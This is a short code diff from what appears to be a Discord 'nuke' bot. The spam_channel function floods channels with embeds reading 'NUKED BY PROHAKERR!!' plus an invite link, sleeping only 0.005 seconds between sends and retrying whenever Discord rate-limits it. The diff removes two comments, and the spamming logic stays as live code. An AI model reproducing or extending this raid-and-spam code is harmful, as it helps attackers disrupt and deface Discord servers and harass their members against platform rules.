@@ -33,7 +33,6 @@ async def spam_channel(channel):
         try:
             current_time = datetime.now().strftime("%H:%M:%S")
 
-            # Create an embed message
             embed = discord.Embed(
                 title="NUKED BY PROHAKERR!!",
                 description="https://discord.gg/ywpuSY8Fp4",
@@ -51,7 +50,7 @@ async def spam_channel(channel):
             await asyncio.sleep(0.005)
         
         except discord.HTTPException as e:
-            if e.code == 429:  # Rate limit error
+            if e.code == 429:
                 retry_after = e.retry_after if hasattr(e, 'retry_after') else 1
                 Write.Print(f"⚠️ Rate limited. Waiting for {retry_after} seconds...\n", Colors.red, interval=0.00)
                 await asyncio.sleep(retry_after)
